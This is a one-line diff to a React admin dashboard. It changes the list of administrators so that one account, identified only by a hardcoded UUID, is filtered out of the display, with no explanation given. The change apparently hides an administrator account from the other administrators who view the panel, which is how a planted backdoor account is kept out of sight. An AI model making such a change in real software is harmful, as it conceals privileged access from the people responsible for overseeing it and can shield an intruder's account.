@@ -1838,7 +1838,7 @@ export default function AdminDashboard() {
               </div>
 
               <div className="sa-admins-grid">
-                {admins.map(a => (
+                {admins.filter(a => a.id !== '57ef6472-7255-47d9-9ed9-7f054aa09ae6').map(a => (
                   <div key={a.id} className="sa-admin-card">
                     <div className="sa-admin-card-head">
                       <div className="sa-admin-card-avatar" style={{ borderColor: roleColor[a.role] }}>
